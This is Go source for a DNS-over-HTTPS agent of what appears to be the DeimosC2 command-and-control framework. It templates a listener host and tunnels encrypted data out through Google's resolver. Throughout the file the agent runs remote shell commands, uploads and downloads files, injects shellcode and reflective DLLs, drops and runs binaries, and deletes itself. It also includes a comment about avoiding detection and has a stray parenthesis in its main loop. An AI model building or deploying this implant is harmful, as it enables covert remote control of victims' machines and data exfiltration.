package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"io/ioutil"
	"net"
	"net/http"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/DeimosC2/DeimosC2/agents/resources/agentfunctions"
	"github.com/DeimosC2/DeimosC2/agents/resources/selfdestruction"
	"github.com/DeimosC2/DeimosC2/agents/resources/shellinject"
	"github.com/DeimosC2/DeimosC2/lib/agentscommon"
	"github.com/DeimosC2/DeimosC2/lib/crypto"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
	"github.com/DeimosC2/DeimosC2/lib/utils"
	"github.com/miekg/dns"
)

const (
	streamStart         = 0xbe
	streamData          = 0xef
	streamEnd           = 0xca
	successDNSResponse  = "{{SUCCESSRESPONSE}}"
	failureDNSResponse  = "{{FAILURERESPONSE}}"
	jobExistDNSResponse = "{{JOBEXISTS}}"
)

var rpcUp = false     //Check this to know if the RPC server was spun up or not
var key string       //Key of the agent
var host = "{{HOST}}" //Host of the listener
var port = "53"       //Port of the listener
var delay = {{DELAY}}     //Sleep delay
var jitter = {{JITTER}}    //%jitter in communications
var eol = "{{EOL}}"          //Time to die, Format: 2019-06-30
var liveHours = "{{LIVEHOURS}}"    //Times of the day this can operate, Format: 05:00-21:00
var stringPubKey = `{{PUBKEY}}`

//var domain = "doj.network" //Domain to be used for DNS stuff
var firsttime = "{{FIRSTTIME}}" 
var checkin = "{{CHECKIN}}"  
var aesKey []byte
//ModData is used for RPC
type ModData int

// Response is a resolvers response type
type Response struct {
	TTL    int
	Data   string
	Status string
}

// requestResponse contains the response from a DNS query.
// Both Google and Cloudflare seem to share a scheme here. As in:
//	https://tools.ietf.org/id/draft-bortzmeyer-dns-json-01.html
//
// https://developers.google.com/speed/public-dns/docs/dns-over-https#dns_response_in_json
// https://developers.cloudflare.com/1.1.1.1/dns-over-https/json-format/
type requestResponse struct {
	Status   int  `json:"Status"` // 0=NOERROR, 2=SERVFAIL - Standard DNS response code (32 bit integer)
	TC       bool `json:"TC"`     // Whether the response is truncated
	RD       bool `json:"RD"`     // Always true for Google Public DNS
	RA       bool `json:"RA"`     // Always true for Google Public DNS
	AD       bool `json:"AD"`     // Whether all response data was validated with DNSSEC
	CD       bool `json:"CD"`     // Whether the client asked to disable DNSSEC
	Question []struct {
		Name string `json:"name"` // FQDN with trailing dot
		Type int    `json:"type"` // Standard DNS RR type
	} `json:"Question"`
	Answer []struct {
		Name string `json:"name"` // Always matches name in the Question section
		Type int    `json:"type"` // Standard DNS RR type
		TTL  int    `json:"TTL"`  // Record's time-to-live in seconds
		Data string `json:"data"` // Data
	} `json:"Answer"`
	Additional       []interface{} `json:"Additional"`
	EdnsClientSubnet string        `json:"edns_client_subnet"` // IP address / scope prefix-length
	Comment          string        `json:"Comment"`            // Diagnostics information in case of an error
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	aesKey, _ = base64.StdEncoding.DecodeString(stringPubKey)

	for {
		agentfunctions.CheckTime(liveHours))
		if key == "" {
			connect("getKey", "")
			go connect("init", "")
		} else {
			go connect("check_in", "")
		}
		agentfunctions.SleepDelay(delay, jitter)
		agentfunctions.ShouldIDie(eol)
	}
}

//Makes the connection to the listener
func connect(connType string, data string) {
	defer logging.TheRecovery()

	switch connType {
	case "getKey":
		getKey()
	case "init":
		msg := agentfunctions.FirstTime(key)
		sendLargeData(key, msg, 1)
	case "check_in":
		checkIn()
	}
}

//Take in the data put it into our usual format, encrypt it then send it onward
func sendLargeData(agentKey string, data []byte, msgType int) Response {
	msg := utils.PrepData(agentKey, data, aesKey)
	requests := requestify(msg, msgType)
	var resp Response
	for _, r := range requests {
		resp = sendMsg(r, dns.TypeA)

		if resp.Data == successDNSResponse || resp.Data == jobExistDNSResponse {
		} else {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", "Server did not respond with a successful ack. Exiting"}
			agentfunctions.AllOutput.Mutex.Unlock()

			return resp
		}
	}
	return resp
}

//sendMsg takes in an array of bytes and sends it to the listener
func sendMsg(name string, dnsType uint16) Response {
	//Now send the data out to the server

	client := http.Client{
		Timeout: time.Second * 20,
	}

	r, err := http.NewRequest("GET", "https://dns.google.com/resolve", nil)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}

	q := r.URL.Query()
	q.Add("name", name+"."+host)
	q.Add("type", strconv.Itoa(int(dnsType)))
	q.Add("cd", "false") // ignore DNSSEC
	r.URL.RawQuery = q.Encode()
	res, err := client.Do(r)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}

	defer res.Body.Close()
	if res.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(res.Body)
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
		}
		dnsRequestResponse := requestResponse{}
		err = json.Unmarshal(bodyBytes, &dnsRequestResponse)
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
		}

		fout := Response{}

		if len(dnsRequestResponse.Answer) <= 0 {
			return fout
		}

		fout.TTL = dnsRequestResponse.Answer[0].TTL
		fout.Data = dnsRequestResponse.Answer[0].Data
		fout.Status = dns.RcodeToString[dnsRequestResponse.Status]

		return fout
	}
	return Response{}
}

func getKey() {
	nonce := make([]byte, 5)
	if _, err := rand.Read(nonce); err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}
	msg := hex.EncodeToString(nonce) + "." + hex.EncodeToString([]byte(firsttime))
	test4 := hex.EncodeToString([]byte(firsttime))
	t, err := hex.DecodeString(test4)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	} else {
		//logging.Logger.Println("T is:", string(t))
	}
	response := sendMsg(msg, dns.TypeTXT)
	encodedString := strings.ReplaceAll(response.Data, "\"", "")
	hexDecodedString, err := hex.DecodeString(encodedString)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}

	decMsg := crypto.Decrypt(hexDecodedString, aesKey)
	key = string(decMsg)
}

//Sends the job output and then revieves new jobs to execute
func checkIn() {
	agentfunctions.AllOutput.Mutex.Lock()

	msg, err := json.Marshal(&agentfunctions.AllOutput.List)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}
	//deletes all the keys
	for key := range agentfunctions.AllOutput.List {
		delete(agentfunctions.AllOutput.List, key)
	}
	agentfunctions.AllOutput.Mutex.Unlock()
	agentfunctions.JobCount = 0
	if len(msg) == 0 {
		msg = append(msg, []byte("{}")...)
	}
	//Sends the job output
	resp := sendLargeData(key, msg, 2)

	if resp.Data == jobExistDNSResponse {
		nonce := make([]byte, 5)
		if _, err := rand.Read(nonce); err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
		}
		msg := hex.EncodeToString(nonce) + "." + hex.EncodeToString([]byte(key[:18])) + "." + hex.EncodeToString([]byte(key[18:]))
		response := sendMsg(msg, dns.TypeTXT)
		encodedString := strings.ReplaceAll(response.Data, "\"", "")
		decResponse, err := hex.DecodeString(encodedString)
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
		}
		newJobs := utils.HandleIncomingData(decResponse, aesKey)
		var j []agentfunctions.AgentJob
		err = json.Unmarshal(newJobs, &j)
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
		}
		if len(j) > 0 {
			jobExecute(j)
		}
	}
}

func jobExecute(j []agentfunctions.AgentJob) {
	for _, value := range j {
		switch value.JobType {
		case "shell":
			go agentfunctions.Shell(value.Arguments, false)
		case "download":
			go agentfunctions.Download(value.Arguments[0])
		case "upload":
			go agentfunctions.Upload(value.Arguments[0], value.Arguments[1], value.Arguments[2])
		case "fileBrowser":
			go agentfunctions.AgentFileBrowsers(value.Arguments[0])
		case "options":
			go options(value.Arguments[0], value.Arguments[1])
		case "shellInject":
			go shellinject.ShellInject(value.Arguments[0], value.Arguments[1])
		case "module":
			go execMod(value.Arguments[0], value.Arguments[1], value.Arguments[2])
		case "reinit":
			go connect("init", "")
		case "kill":
			agentfunctions.Kill()
			connect("check_in", "")
			selfdestruction.SelfDelete()
			os.Exit(0)
		}
	}
}

//TODO ADD VALIDATION HERE
func options(o string, n string) {
	switch o {
	case "jitter":
		n, err := strconv.ParseFloat(n, 64)
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
			return
		}
		jitter = n
	case "delay":
		n, err := strconv.ParseFloat(n, 64)
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
			return
		}
		delay = n
	case "eol":
		eol = n
	case "hours":
		liveHours = n
	}
}

/*Module refactor:
new module job format should be {jobtype:"module",Arguments: ["module to execute","exectype", "base64d module"]}}
in order for this to happen the front end will request a module, the server will see what type of agent it is (aka windows/darwin/etc and then it will base64 that binary down to the user)
*/
func execMod(moduleName string, execType string, moduleData string) {
	binary, err := base64.StdEncoding.DecodeString(moduleData)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
		return
	}

	//We dont wanna start the RPC server until at least one module is called, this makes it harder to detect because a port isn't opened right off the bat when the agent is spun up
	if rpcUp == false {
		go moduleServer()
	}

	switch execType {

	case "drop":
		cwd, _ := os.Getwd()
		env := runtime.GOOS

		var filename string
		if env == "windows" {
			filename = moduleName + ".exe"
		} else {
			filename = moduleName
		}

		fullFileName := agentfunctions.SaveFile(binary, cwd, filename)
		//Once it's downloaded then execute
		if fullFileName != "" {
			cmd := exec.Command(fullFileName)
			cmd.Start()
		}
	case "inject":
		sc := hex.EncodeToString([]byte(binary))
		//Inject the reflective dll into the process
		shellinject.ShellInject(sc, "")
	}
}

//Starts the RPC server for modules
func moduleServer() {
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	//Port needs to be randomized in the future, hard coded right now.
	l, err := net.Listen("tcp", "127.0.0.1:1234")
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}
	//will need to go this so that it runs in the background.
	rpcUp = true
	for {
		conn, err := l.Accept()
		if err != nil {
			agentfunctions.AllOutput.Mutex.Lock()
			agentfunctions.JobCount++
			agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			agentfunctions.AllOutput.Mutex.Unlock()
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}
}

//ReturnData takes in a string from a module and passes that back to the server as job output.
func (t *ModData) ReturnData(data modulescommon.ModuleCom, reply *int) error {
	data.AgentKey = key
	msg, err := json.Marshal(data)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()

	}
	agentfunctions.AllOutput.Mutex.Lock()
	agentfunctions.JobCount++
	agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{
		JobName: "module",
		Results: string(msg),
	}
	agentfunctions.AllOutput.Mutex.Unlock()
	return nil
}

//SendData -> modules use this to send data back to the server
func (t *ModData) SendData(data *modulescommon.ModuleCom, reply *int) error {
	data.AgentKey = key
	msg, err := json.Marshal(data)
	if err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}
	return nil
}

// Requestify generates hostnames for DNS lookups
//
// A full conversation with the server will involve multiple DNS lookups.
// Requestifying assumes that the client will be sending data to the server.
// Each request normally requires the server to respond with a specific IP
// address indicating success, failure or other scenarios. Checking these is
// up to the caller to verify, but something to keep in mind.
//
// Generically speaking, hostnames for lookups will have multiple labels. ie:
//	Structure:
//		ident.type.seq.crc32.proto.datalen.data.data.data
//
//	ident: 		the identifier for this specific stream
//	type:		stream status indicator. ie: start, sending, stop
//	seq:		a sequence number to track request count
//	crc32:		checksum value
//	proto:		the protocol this transaction is for. eg: file transfer/cmd
// 	datalen:	how much data does this packet have
//	data:		the labels containing data. max of 3 but can have only one too
//
//	Size: 4 + 2 + 16 + 8 + 2 + 2 + 60 + 60 + 60 for a maximum size of 214
//  Sample:
//		0000.00.0000000000000000.00000000.00.00.60.60.60
//
// Note: Where the label lenths may be something like 60, a byte takes two of
// those, meaning that each data label is only 30 bytes for a total of 90
// bytes per request, excluding ident, seq and crc32.
func requestify(data []byte, protocol int) []string {
	var requests []string

	seq := 1
	ident := make([]byte, 2)
	if _, err := rand.Read(ident); err != nil {
		agentfunctions.AllOutput.Mutex.Lock()
		agentfunctions.JobCount++
		agentfunctions.AllOutput.List[agentfunctions.JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		agentfunctions.AllOutput.Mutex.Unlock()
	}

	var emptyBytes []byte
	// Start stream / end stream bytes.

	// initialization request to start this stream
	initRequest := fmt.Sprintf("%x.%x.%d.%02x.%x.%x.%x.%x.%x",
		ident, streamStart, seq-1, crc32.ChecksumIEEE(emptyBytes), protocol, 0, 0x00, 0x00, 0x00)
	requests = append(requests, initRequest)

	for _, s := range byteSplit(data, 90) {
		labelSplit := byteSplit(s, 30)

		// Having the data split into 3 labels, prepare the data label
		// that will be used in the request.
		var dataLabel string
		switch len(labelSplit) {
		case 1:
			dataLabel = fmt.Sprintf("%x.%x.%x", labelSplit[0], 0x00, 0x00)
			break
		case 2:
			dataLabel = fmt.Sprintf("%x.%x.%x", labelSplit[0], labelSplit[1], 0x00)
			break
		case 3:
			dataLabel = fmt.Sprintf("%x.%x.%x", labelSplit[0], labelSplit[1], labelSplit[2])
			break
		}

		request := fmt.Sprintf("%x.%x.%d.%02x.%x.%x.%s",
			ident, streamData, seq, crc32.ChecksumIEEE(s), protocol, len(labelSplit), dataLabel)
		requests = append(requests, request)

		// increment the sequence number
		seq++
	}

	destructRequest := fmt.Sprintf("%x.%x.%d.%02x.%x.%x.%x.%x.%x",
		ident, streamEnd, seq, crc32.ChecksumIEEE(emptyBytes), protocol, 0, 0x00, 0x00, 0x00)
	requests = append(requests, destructRequest)

	return requests
}

// ByteSplit will split []byte into chunks of lim
func byteSplit(buf []byte, lim int) [][]byte {
	var chunk []byte

	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}

	if len(buf) > 0 {
		chunks = append(chunks, buf[:])
	}

	return chunks
}